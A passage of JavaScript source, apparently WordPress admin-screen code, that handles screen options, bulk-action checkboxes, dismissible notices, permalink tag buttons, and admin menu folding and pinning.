		this.hidden = function(){
			return $('.hide-column-tog').not(':checked').map(function() {
				var id = this.id;
				return id.substring( id, id.length - 5 );
			}).get().join(',');
		};
	},

	/**
	 * Adjusts the column span for the table.
	 *
	 * @since 3.1.0
	 *
	 * @param {number} diff The modifier for the column span.
	 */
	colSpanChange : function(diff) {
		var $t = $('table').find('.colspanchange'), n;
		if ( !$t.length )
			return;
		n = parseInt( $t.attr('colspan'), 10 ) + diff;
		$t.attr('colspan', n.toString());
	}
};

$( function() { columns.init(); } );

/**
 * Validates that the required form fields are not empty.
 *
 * @since 2.9.0
 *
 * @param {jQuery} form The form to validate.
 *
 * @return {boolean} Returns true if all required fields are not an empty string.
 */
window.validateForm = function( form ) {
	return !$( form )
		.find( '.form-required' )
		.filter( function() { return $( ':input:visible', this ).val() === ''; } )
		.addClass( 'form-invalid' )
		.find( ':input:visible' )
		.on( 'change', function() { $( this ).closest( '.form-invalid' ).removeClass( 'form-invalid' ); } )
		.length;
};

// Stub for doing better warnings.
/**
 * Shows message pop-up notice or confirmation message.
 *
 * @since 2.7.0
 *
 * @type {{warn: showNotice.warn, note: showNotice.note}}
 *
 * @return {void}
 */
window.showNotice = {

	/**
	 * Shows a delete confirmation pop-up message.
	 *
	 * @since 2.7.0
	 *
	 * @return {boolean} Returns true if the message is confirmed.
	 */
	warn : function() {
		if ( confirm( __( 'You are about to permanently delete these items from your site.\nThis action cannot be undone.\n\'Cancel\' to stop, \'OK\' to delete.' ) ) ) {
			return true;
		}

		return false;
	},

	/**
	 * Shows an alert message.
	 *
	 * @since 2.7.0
	 *
	 * @param text The text to display in the message.
	 */
	note : function(text) {
		alert(text);
	}
};

/**
 * Represents the functions for the meta screen options panel.
 *
 * @since 3.2.0
 *
 * @type {{element: null, toggles: null, page: null, init: screenMeta.init,
 *         toggleEvent: screenMeta.toggleEvent, open: screenMeta.open,
 *         close: screenMeta.close}}
 *
 * @return {void}
 */
window.screenMeta = {
	element: null, // #screen-meta
	toggles: null, // .screen-meta-toggle
	page:    null, // #wpcontent

	/**
	 * Initializes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	init: function() {
		this.element = $('#screen-meta');
		this.toggles = $( '#screen-meta-links' ).find( '.show-settings' );
		this.page    = $('#wpcontent');

		this.toggles.on( 'click', this.toggleEvent );
	},

	/**
	 * Toggles the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	toggleEvent: function() {
		var panel = $( '#' + $( this ).attr( 'aria-controls' ) );

		if ( !panel.length )
			return;

		if ( panel.is(':visible') )
			screenMeta.close( panel, $(this) );
		else
			screenMeta.open( panel, $(this) );
	},

	/**
	 * Opens the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	open: function( panel, button ) {

		$( '#screen-meta-links' ).find( '.screen-meta-toggle' ).not( button.parent() ).css( 'visibility', 'hidden' );

		panel.parent().show();

		/**
		 * Sets the focus to the meta options panel and adds the necessary CSS classes.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideDown( 'fast', function() {
			panel.removeClass( 'hidden' ).trigger( 'focus' );
			button.addClass( 'screen-meta-active' ).attr( 'aria-expanded', true );
		});

		$document.trigger( 'screen:options:open' );
	},

	/**
	 * Closes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	close: function( panel, button ) {
		/**
		 * Hides the screen meta options panel.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideUp( 'fast', function() {
			button.removeClass( 'screen-meta-active' ).attr( 'aria-expanded', false );
			$('.screen-meta-toggle').css('visibility', '');
			panel.parent().hide();
			panel.addClass( 'hidden' );
		});

		$document.trigger( 'screen:options:close' );
	}
};

/**
 * Initializes the help tabs in the help panel.
 *
 * @param {Event} e The event object.
 *
 * @return {void}
 */
$('.contextual-help-tabs').on( 'click', 'a', function(e) {
	var link = $(this),
		panel;

	e.preventDefault();

	// Don't do anything if the click is for the tab already showing.
	if ( link.is('.active a') )
		return false;

	// Links.
	$('.contextual-help-tabs .active').removeClass('active');
	link.parent('li').addClass('active');

	panel = $( link.attr('href') );

	// Panels.
	$('.help-tab-content').not( panel ).removeClass('active').hide();
	panel.addClass('active').show();
});

/**
 * Update custom permalink structure via buttons.
 */
var permalinkStructureFocused = false,
    $permalinkStructure       = $( '#permalink_structure' ),
    $permalinkStructureInputs = $( '.permalink-structure input:radio' ),
    $permalinkCustomSelection = $( '#custom_selection' ),
    $availableStructureTags   = $( '.form-table.permalink-structure .available-structure-tags button' );

// Change permalink structure input when selecting one of the common structures.
$permalinkStructureInputs.on( 'change', function() {
	if ( 'custom' === this.value ) {
		return;
	}

	$permalinkStructure.val( this.value );

	// Update button states after selection.
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$permalinkStructure.on( 'click input', function() {
	$permalinkCustomSelection.prop( 'checked', true );
} );

// Check if the permalink structure input field has had focus at least once.
$permalinkStructure.on( 'focus', function( event ) {
	permalinkStructureFocused = true;
	$( this ).off( event );
} );

/**
 * Enables or disables a structure tag button depending on its usage.
 *
 * If the structure is already used in the custom permalink structure,
 * it will be disabled.
 *
 * @param {Object} button Button jQuery object.
 */
function changeStructureTagButtonState( button ) {
	if ( -1 !== $permalinkStructure.val().indexOf( button.text().trim() ) ) {
		button.attr( 'data-label', button.attr( 'aria-label' ) );
		button.attr( 'aria-label', button.attr( 'data-used' ) );
		button.attr( 'aria-pressed', true );
		button.addClass( 'active' );
	} else if ( button.attr( 'data-label' ) ) {
		button.attr( 'aria-label', button.attr( 'data-label' ) );
		button.attr( 'aria-pressed', false );
		button.removeClass( 'active' );
	}
}

// Check initial button state.
$availableStructureTags.each( function() {
	changeStructureTagButtonState( $( this ) );
} );

// Observe permalink structure field and disable buttons of tags that are already present.
$permalinkStructure.on( 'change', function() {
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$availableStructureTags.on( 'click', function() {
	var permalinkStructureValue = $permalinkStructure.val(),
	    selectionStart          = $permalinkStructure[ 0 ].selectionStart,
	    selectionEnd            = $permalinkStructure[ 0 ].selectionEnd,
	    textToAppend            = $( this ).text().trim(),
	    textToAnnounce,
	    newSelectionStart;

	if ( $( this ).hasClass( 'active' ) ) {
		textToAnnounce = $( this ).attr( 'data-removed' );
	} else {
		textToAnnounce = $( this ).attr( 'data-added' );
	}

	// Remove structure tag if already part of the structure.
	if ( -1 !== permalinkStructureValue.indexOf( textToAppend ) ) {
		permalinkStructureValue = permalinkStructureValue.replace( textToAppend + '/', '' );

		$permalinkStructure.val( '/' === permalinkStructureValue ? '' : permalinkStructureValue );

		// Announce change to screen readers.
		$( '#custom_selection_updated' ).text( textToAnnounce );

		// Disable button.
		changeStructureTagButtonState( $( this ) );

		return;
	}

	// Input field never had focus, move selection to end of input.
	if ( ! permalinkStructureFocused && 0 === selectionStart && 0 === selectionEnd ) {
		selectionStart = selectionEnd = permalinkStructureValue.length;
	}

	$permalinkCustomSelection.prop( 'checked', true );

	// Prepend and append slashes if necessary.
	if ( '/' !== permalinkStructureValue.substr( 0, selectionStart ).substr( -1 ) ) {
		textToAppend = '/' + textToAppend;
	}

	if ( '/' !== permalinkStructureValue.substr( selectionEnd, 1 ) ) {
		textToAppend = textToAppend + '/';
	}

	// Insert structure tag at the specified position.
	$permalinkStructure.val( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend + permalinkStructureValue.substr( selectionEnd ) );

	// Announce change to screen readers.
	$( '#custom_selection_updated' ).text( textToAnnounce );

	// Disable button.
	changeStructureTagButtonState( $( this ) );

	// If input had focus give it back with cursor right after appended text.
	if ( permalinkStructureFocused && $permalinkStructure[0].setSelectionRange ) {
		newSelectionStart = ( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend ).length;
		$permalinkStructure[0].setSelectionRange( newSelectionStart, newSelectionStart );
		$permalinkStructure.trigger( 'focus' );
	}
} );

$( function() {
	var checks, first, last, checked, sliced, mobileEvent, transitionTimeout, focusedRowActions,
		lastClicked = false,
		pageInput = $('input.current-page'),
		currentPage = pageInput.val(),
		isIOS = /iPhone|iPad|iPod/.test( navigator.userAgent ),
		isAndroid = navigator.userAgent.indexOf( 'Android' ) !== -1,
		$adminMenuWrap = $( '#adminmenuwrap' ),
		$wpwrap = $( '#wpwrap' ),
		$adminmenu = $( '#adminmenu' ),
		$overlay = $( '#wp-responsive-overlay' ),
		$toolbar = $( '#wp-toolbar' ),
		$toolbarPopups = $toolbar.find( 'a[aria-haspopup="true"]' ),
		$sortables = $('.meta-box-sortables'),
		wpResponsiveActive = false,
		$adminbar = $( '#wpadminbar' ),
		lastScrollPosition = 0,
		pinnedMenuTop = false,
		pinnedMenuBottom = false,
		menuTop = 0,
		menuState,
		menuIsPinned = false,
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		},
		$headerEnd = $( '.wp-header-end' );

	/**
	 * Makes the fly-out submenu header clickable, when the menu is folded.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$adminmenu.on('click.wp-submenu-head', '.wp-submenu-head', function(e){
		$(e.target).parent().siblings('a').get(0).click();
	});

	/**
	 * Collapses the admin menu.
	 *
	 * @return {void}
	 */
	$( '#collapse-button' ).on( 'click.collapse-menu', function() {
		var viewportWidth = getViewportWidth() || 961;

		// Reset any compensation for submenus near the bottom of the screen.
		$('#adminmenu div.wp-submenu').css('margin-top', '');

		if ( viewportWidth <= 960 ) {
			if ( $body.hasClass('auto-fold') ) {
				$body.removeClass('auto-fold').removeClass('folded');
				setUserSetting('unfold', 1);
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('auto-fold');
				setUserSetting('unfold', 0);
				menuState = 'folded';
			}
		} else {
			if ( $body.hasClass('folded') ) {
				$body.removeClass('folded');
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('folded');
				setUserSetting('mfold', 'f');
				menuState = 'folded';
			}
		}

		$document.trigger( 'wp-collapse-menu', { state: menuState } );
	});

	/**
	 * Ensures an admin submenu is within the visual viewport.
	 *
	 * @since 4.1.0
	 *
	 * @param {jQuery} $menuItem The parent menu item containing the submenu.
	 *
	 * @return {void}
	 */
	function adjustSubmenu( $menuItem ) {
		var bottomOffset, pageHeight, adjustment, theFold, menutop, wintop, maxtop,
			$submenu = $menuItem.find( '.wp-submenu' );

		menutop = $menuItem.offset().top;
		wintop = $window.scrollTop();
		maxtop = menutop - wintop - 30; // max = make the top of the sub almost touch admin bar.

		bottomOffset = menutop + $submenu.height() + 1; // Bottom offset of the menu.
		pageHeight = $wpwrap.height();                  // Height of the entire page.
		adjustment = 60 + bottomOffset - pageHeight;
		theFold = $window.height() + wintop - 50;       // The fold.

		if ( theFold < ( bottomOffset - adjustment ) ) {
			adjustment = bottomOffset - theFold;
		}

		if ( adjustment > maxtop ) {
			adjustment = maxtop;
		}

		if ( adjustment > 1 && $('#wp-admin-bar-menu-toggle').is(':hidden') ) {
			$submenu.css( 'margin-top', '-' + adjustment + 'px' );
		} else {
			$submenu.css( 'margin-top', '' );
		}
	}

	if ( 'ontouchstart' in window || /IEMobile\/[1-9]/.test(navigator.userAgent) ) { // Touch screen device.
		// iOS Safari works with touchstart, the rest work with click.
		mobileEvent = isIOS ? 'touchstart' : 'click';

		/**
		 * Closes any open submenus when touch/click is not on the menu.
		 *
		 * @param {Event} e The event object.
		 *
		 * @return {void}
		 */
		$body.on( mobileEvent+'.wp-mobile-hover', function(e) {
			if ( $adminmenu.data('wp-responsive') ) {
				return;
			}

			if ( ! $( e.target ).closest( '#adminmenu' ).length ) {
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
			}
		});

		/**
		 * Handles the opening or closing the submenu based on the mobile click|touch event.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.find( 'a.wp-has-submenu' ).on( mobileEvent + '.wp-mobile-hover', function( event ) {
			var $menuItem = $(this).parent();

			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			/*
			 * Show the sub instead of following the link if:
			 * 	- the submenu is not open.
			 * 	- the submenu is not shown inline or the menu is not folded.
			 */
			if ( ! $menuItem.hasClass( 'opensub' ) && ( ! $menuItem.hasClass( 'wp-menu-open' ) || $menuItem.width() < 40 ) ) {
				event.preventDefault();
				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass('opensub');
			}
		});
	}

	if ( ! isIOS && ! isAndroid ) {
		$adminmenu.find( 'li.wp-has-submenu' ).hoverIntent({

			/**
			 * Opens the submenu when hovered over the menu item for desktops.
			 *
			 * @return {void}
			 */
			over: function() {
				var $menuItem = $( this ),
					$submenu = $menuItem.find( '.wp-submenu' ),
					top = parseInt( $submenu.css( 'top' ), 10 );

				if ( isNaN( top ) || top > -5 ) { // The submenu is visible.
					return;
				}

				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass( 'opensub' );
			},

			/**
			 * Closes the submenu when no longer hovering the menu item.
			 *
			 * @return {void}
			 */
			out: function(){
				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				$( this ).removeClass( 'opensub' ).find( '.wp-submenu' ).css( 'margin-top', '' );
			},
			timeout: 200,
			sensitivity: 7,
			interval: 90
		});

		/**
		 * Opens the submenu on when focused on the menu item.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.on( 'focus.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				// The menu is in responsive mode, bail.
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).addClass( 'opensub' );

			/**
			 * Closes the submenu on blur from the menu item.
			 *
			 * @param {Event} event The event object.
			 *
			 * @return {void}
			 */
		}).on( 'blur.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).removeClass( 'opensub' );

			/**
			 * Adjusts the size for the submenu.
			 *
			 * @return {void}
			 */
		}).find( 'li.wp-has-submenu.wp-not-current-submenu' ).on( 'focusin.adminmenu', function() {
			adjustSubmenu( $( this ) );
		});
	}

	/*
	 * The `.below-h2` class is here just for backward compatibility with plugins
	 * that are (incorrectly) using it. Do not use. Use `.inline` instead. See #34570.
	 * If '.wp-header-end' is found, append the notices after it otherwise
	 * after the first h1 or h2 heading found within the main content.
	 */
	if ( ! $headerEnd.length ) {
		$headerEnd = $( '.wrap h1, .wrap h2' ).first();
	}
	$( 'div.updated, div.error, div.notice' ).not( '.inline, .below-h2' ).insertAfter( $headerEnd );

	/**
	 * Makes notices dismissible.
	 *
	 * @since 4.4.0
	 *
	 * @return {void}
	 */
	function makeNoticesDismissible() {
		$( '.notice.is-dismissible' ).each( function() {
			var $el = $( this ),
				$button = $( '<button type="button" class="notice-dismiss"><span class="screen-reader-text"></span></button>' );

			if ( $el.find( '.notice-dismiss' ).length ) {
				return;
			}

			// Ensure plain text.
			$button.find( '.screen-reader-text' ).text( __( 'Dismiss this notice.' ) );
			$button.on( 'click.wp-dismiss-notice', function( event ) {
				event.preventDefault();
				$el.fadeTo( 100, 0, function() {
					$el.slideUp( 100, function() {
						$el.remove();
					});
				});
			});

			$el.append( $button );
		});
	}

	$document.on( 'wp-updates-notice-added wp-plugin-install-error wp-plugin-update-error wp-plugin-delete-error wp-theme-install-error wp-theme-delete-error wp-notice-added', makeNoticesDismissible );

	// Init screen meta.
	screenMeta.init();

	/**
	 * Checks a checkbox.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @return {boolean} Returns whether a checkbox is checked or not.
	 */
	$body.on( 'click', 'tbody > tr > .check-column :checkbox', function( event ) {
		// Shift click to select a range of checkboxes.
		if ( 'undefined' == event.shiftKey ) { return true; }
		if ( event.shiftKey ) {
			if ( !lastClicked ) { return true; }
			checks = $( lastClicked ).closest( 'form' ).find( ':checkbox' ).filter( ':visible:enabled' );
			first = checks.index( lastClicked );
			last = checks.index( this );
			checked = $(this).prop('checked');
			if ( 0 < first && 0 < last && first != last ) {
				sliced = ( last > first ) ? checks.slice( first, last ) : checks.slice( last, first );
				sliced.prop( 'checked', function() {
					if ( $(this).closest('tr').is(':visible') )
						return checked;

					return false;
				});
			}
		}
		lastClicked = this;

		// Toggle the "Select all" checkboxes depending if the other ones are all checked or not.
		var unchecked = $(this).closest('tbody').find('tr').find(':checkbox').filter(':visible:enabled').not(':checked');

		/**
		 * Determines if all checkboxes are checked.
		 *
		 * @return {boolean} Returns true if there are no unchecked checkboxes.
		 */
		$(this).closest('table').children('thead, tfoot').find(':checkbox').prop('checked', function() {
			return ( 0 === unchecked.length );
		});

		return true;
	});

	/**
	 * Controls all the toggles on bulk toggle change.
	 *
	 * When the bulk checkbox is changed, all the checkboxes in the tables are changed accordingly.
	 * When the shift-button is pressed while changing the bulk checkbox the checkboxes in the table are inverted.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @param {Event} event The event object.
	 *
	 * @return {boolean}
	 */
	$body.on( 'click.wp-toggle-checkboxes', 'thead .check-column :checkbox, tfoot .check-column :checkbox', function( event ) {
		var $this = $(this),
			$table = $this.closest( 'table' ),
			controlChecked = $this.prop('checked'),
			toggle = event.shiftKey || $this.data('wp-toggle');

		$table.children( 'tbody' ).filter(':visible')
			.children().children('.check-column').find(':checkbox')
			/**
			 * Updates the checked state on the checkbox in the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( $(this).is(':hidden,:disabled') ) {
					return false;
				}

				if ( toggle ) {
					return ! $(this).prop( 'checked' );
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});

		$table.children('thead,  tfoot').filter(':visible')
			.children().children('.check-column').find(':checkbox')

			/**
			 * Syncs the bulk checkboxes on the top and bottom of the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( toggle ) {
					return false;
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});
	});

	/**
	 * Marries a secondary control to its primary control.
	 *
	 * @param {jQuery} topSelector    The top selector element.
	 * @param {jQuery} topSubmit      The top submit element.
	 * @param {jQuery} bottomSelector The bottom selector element.
	 * @param {jQuery} bottomSubmit   The bottom submit element.
	 * @return {void}
	 */
	function marryControls( topSelector, topSubmit, bottomSelector, bottomSubmit ) {
		/**
		 * Updates the primary selector when the secondary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateTopSelector() {
			topSelector.val($(this).val());
		}
		bottomSelector.on('change', updateTopSelector);

		/**
		 * Updates the secondary selector when the primary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateBottomSelector() {
			bottomSelector.val($(this).val());
		}
		topSelector.on('change', updateBottomSelector);

		/**
		 * Triggers the primary submit when then secondary submit is clicked.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function triggerSubmitClick(e) {
			e.preventDefault();
			e.stopPropagation();

			topSubmit.trigger('click');
		}
		bottomSubmit.on('click', triggerSubmitClick);
	}

	// Marry the secondary "Bulk actions" controls to the primary controls:
	marryControls( $('#bulk-action-selector-top'), $('#doaction'), $('#bulk-action-selector-bottom'), $('#doaction2') );

	// Marry the secondary "Change role to" controls to the primary controls:
	marryControls( $('#new_role'), $('#changeit'), $('#new_role2'), $('#changeit2') );

	var addAdminNotice = function( data ) {
		var $notice = $( data.selector ),
			$headerEnd = $( '.wp-header-end' ),
			type,
			dismissible,
			$adminNotice;

		delete data.selector;

		dismissible = ( data.dismissible && data.dismissible === true ) ? ' is-dismissible' : '';
		type        = ( data.type ) ? data.type : 'info';

		$adminNotice = '<div id="' + data.id + '" class="notice notice-' + data.type + dismissible + '"><p>' + data.message + '</p></div>';

		// Check if this admin notice already exists.
		if ( ! $notice.length ) {
			$notice = $( '#' + data.id );
		}

		if ( $notice.length ) {
			$notice.replaceWith( $adminNotice );
		} else if ( $headerEnd.length ) {
			$headerEnd.after( $adminNotice );
		} else {
			if ( 'customize' === pagenow ) {
				$( '.customize-themes-notifications' ).append( $adminNotice );
			} else {
				$( '.wrap' ).find( '> h1' ).after( $adminNotice );
			}
		}

		$document.trigger( 'wp-notice-added' );
	};

	$( '.bulkactions' ).parents( 'form' ).on( 'submit', function( event ) {
		var form = this,
			submitterName = event.originalEvent && event.originalEvent.submitter ? event.originalEvent.submitter.name : false,
			currentPageSelector = form.querySelector( '#current-page-selector' );

		if ( currentPageSelector && currentPageSelector.defaultValue !== currentPageSelector.value ) {
			return; // Pagination form submission.
		}

		// Observe submissions from posts lists for 'bulk_action' or users lists for 'new_role'.
		var bulkFieldRelations = {
			'bulk_action' : window.bulkActionObserverIds.bulk_action,
			'changeit' : window.bulkActionObserverIds.changeit
		};
		if ( ! Object.keys( bulkFieldRelations ).includes( submitterName ) ) {
			return;
		}

		var values = new FormData(form);
		var value = values.get( bulkFieldRelations[ submitterName ] ) || '-1';

		// Check that the action is not the default one.
		if ( value !== '-1' ) {
			// Check that at least one item is selected.
			var itemsSelected = form.querySelectorAll( '.wp-list-table tbody .check-column input[type="checkbox"]:checked' );

			if ( itemsSelected.length > 0 ) {
				return;
			}
		}
		event.preventDefault();
		event.stopPropagation();
		$( 'html, body' ).animate( { scrollTop: 0 } );

		var errorMessage = __( 'Please select at least one item to perform this action on.' );
		addAdminNotice( {
			id: 'no-items-selected',
			type: 'error',
			message: errorMessage,
			dismissible: true,
		} );

		wp.a11y.speak( errorMessage );
	});

	/**
	 * Shows row actions on focus of its parent container element or any other elements contained within.
	 *
	 * @return {void}
	 */
	$( '#wpbody-content' ).on({
		focusin: function() {
			clearTimeout( transitionTimeout );
			focusedRowActions = $( this ).find( '.row-actions' );
			// transitionTimeout is necessary for Firefox, but Chrome won't remove the CSS class without a little help.
			$( '.row-actions' ).not( this ).removeClass( 'visible' );
			focusedRowActions.addClass( 'visible' );
		},
		focusout: function() {
			// Tabbing between post title and .row-actions links needs a brief pause, otherwise
			// the .row-actions div gets hidden in transit in some browsers (ahem, Firefox).
			transitionTimeout = setTimeout( function() {
				focusedRowActions.removeClass( 'visible' );
			}, 30 );
		}
	}, '.table-view-list .has-row-actions' );

	// Toggle list table rows on small screens.
	$( 'tbody' ).on( 'click', '.toggle-row', function() {
		$( this ).closest( 'tr' ).toggleClass( 'is-expanded' );
	});

	$('#default-password-nag-no').on( 'click', function() {
		setUserSetting('default_password_nag', 'hide');
		$('div.default-password-nag').hide();
		return false;
	});

	/**
	 * Handles tab keypresses in theme and plugin file editor textareas.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$('#newcontent').on('keydown.wpevent_InsertTab', function(e) {
		var el = e.target, selStart, selEnd, val, scroll, sel;

		// After pressing escape key (keyCode: 27), the tab key should tab out of the textarea.
		if ( e.keyCode == 27 ) {
			// When pressing Escape: Opera 12 and 27 blur form fields, IE 8 clears them.
			e.preventDefault();
			$(el).data('tab-out', true);
			return;
		}

		// Only listen for plain tab key (keyCode: 9) without any modifiers.
		if ( e.keyCode != 9 || e.ctrlKey || e.altKey || e.shiftKey )
			return;

		// After tabbing out, reset it so next time the tab key can be used again.
		if ( $(el).data('tab-out') ) {
			$(el).data('tab-out', false);
			return;
		}

		selStart = el.selectionStart;
		selEnd = el.selectionEnd;
		val = el.value;

		// If any text is selected, replace the selection with a tab character.
		if ( document.selection ) {
			el.focus();
			sel = document.selection.createRange();
			sel.text = '\t';
		} else if ( selStart >= 0 ) {
			scroll = this.scrollTop;
			el.value = val.substring(0, selStart).concat('\t', val.substring(selEnd) );
			el.selectionStart = el.selectionEnd = selStart + 1;
			this.scrollTop = scroll;
		}

		// Cancel the regular tab functionality, to prevent losing focus of the textarea.
		if ( e.stopPropagation )
			e.stopPropagation();
		if ( e.preventDefault )
			e.preventDefault();
	});

	// Reset page number variable for new filters/searches but not for bulk actions. See #17685.
	if ( pageInput.length ) {

		/**
		 * Handles pagination variable when filtering the list table.
		 *
		 * Set the pagination argument to the first page when the post-filter form is submitted.
		 * This happens when pressing the 'filter' button on the list table page.
		 *
		 * The pagination argument should not be touched when the bulk action dropdowns are set to do anything.
		 *
		 * The form closest to the pageInput is the post-filter form.
		 *
		 * @return {void}
		 */
		pageInput.closest('form').on( 'submit', function() {
			/*
			 * action = bulk action dropdown at the top of the table
			 */
			if ( $('select[name="action"]').val() == -1 && pageInput.val() == currentPage )
				pageInput.val('1');
		});
	}

	/**
	 * Resets the bulk actions when the search button is clicked.
	 *
	 * @return {void}
	 */
	$('.search-box input[type="search"], .search-box input[type="submit"]').on( 'mousedown', function () {
		$('select[name^="action"]').val('-1');
	});

	/**
	 * Scrolls into view when focus.scroll-into-view is triggered.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
 	 */
	$('#contextual-help-link, #show-settings-link').on( 'focus.scroll-into-view', function(e){
		if ( e.target.scrollIntoViewIfNeeded )
			e.target.scrollIntoViewIfNeeded(false);
	});

	/**
	 * Disables the submit upload buttons when no data is entered.
	 *
	 * @return {void}
	 */
	(function(){
		var button, input, form = $('form.wp-upload-form');

		// Exit when no upload form is found.
		if ( ! form.length )
			return;

		button = form.find('input[type="submit"]');
		input = form.find('input[type="file"]');

		/**
		 * Determines if any data is entered in any file upload input.
		 *
		 * @since 3.5.0
		 *
		 * @return {void}
		 */
		function toggleUploadButton() {
			// When no inputs have a value, disable the upload buttons.
			button.prop('disabled', '' === input.map( function() {
				return $(this).val();
			}).get().join(''));
		}

		// Update the status initially.
		toggleUploadButton();
		// Update the status when any file input changes.
		input.on('change', toggleUploadButton);
	})();

	/**
	 * Pins the menu while distraction-free writing is enabled.
	 *
	 * @param {Event} event Event data.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function pinMenu( event ) {
		var windowPos = $window.scrollTop(),
			resizing = ! event || event.type !== 'scroll';

		if ( isIOS || $adminmenu.data( 'wp-responsive' ) ) {
			return;
		}

		/*
		 * When the menu is higher than the window and smaller than the entire page.
		 * It should be adjusted to be able to see the entire menu.
		 *
		 * Otherwise it can be accessed normally.
		 */
		if ( height.menu + height.adminbar < height.window ||
			height.menu + height.adminbar + 20 > height.wpwrap ) {
			unpinMenu();
			return;
		}

		menuIsPinned = true;

		// If the menu is higher than the window, compensate on scroll.
		if ( height.menu + height.adminbar > height.window ) {
			// Check for overscrolling, this happens when swiping up at the top of the document in modern browsers.
			if ( windowPos < 0 ) {
				// Stick the menu to the top.
				if ( ! pinnedMenuTop ) {
					pinnedMenuTop = true;
					pinnedMenuBottom = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}

				return;
			} else if ( windowPos + height.window > $document.height() - 1 ) {
				// When overscrolling at the bottom, stick the menu to the bottom.
				if ( ! pinnedMenuBottom ) {
					pinnedMenuBottom = true;
					pinnedMenuTop = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}

				return;
			}

			if ( windowPos > lastScrollPosition ) {
				// When a down scroll has been detected.

				// If it was pinned to the top, unpin and calculate relative scroll.
				if ( pinnedMenuTop ) {
					pinnedMenuTop = false;
					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar - ( windowPos - lastScrollPosition );

					if ( menuTop + height.menu + height.adminbar < windowPos + height.window ) {
						menuTop = windowPos + height.window - height.menu - height.adminbar;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuBottom && $adminMenuWrap.offset().top + height.menu < windowPos + height.window ) {
					// Pin it to the bottom.
					pinnedMenuBottom = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}
			} else if ( windowPos < lastScrollPosition ) {
				// When a scroll up is detected.

				// If it was pinned to the bottom, unpin and calculate relative scroll.
				if ( pinnedMenuBottom ) {
					pinnedMenuBottom = false;

					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar + ( lastScrollPosition - windowPos );

					if ( menuTop + height.menu > windowPos + height.window ) {
						menuTop = windowPos;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuTop && $adminMenuWrap.offset().top >= windowPos + height.adminbar ) {

					// Pin it to the top.
					pinnedMenuTop = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}
			} else if ( resizing ) {
				// Window is being resized.

				pinnedMenuTop = pinnedMenuBottom = false;

				// Calculate the new offset.
				menuTop = windowPos + height.window - height.menu - height.adminbar - 1;

				if ( menuTop > 0 ) {
					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else {
					unpinMenu();
				}
			}
		}

		lastScrollPosition = windowPos;
	}

	/**
	 * Determines the height of certain elements.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function resetHeights() {
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		};
	}

	/**
	 * Unpins the menu.
	 *
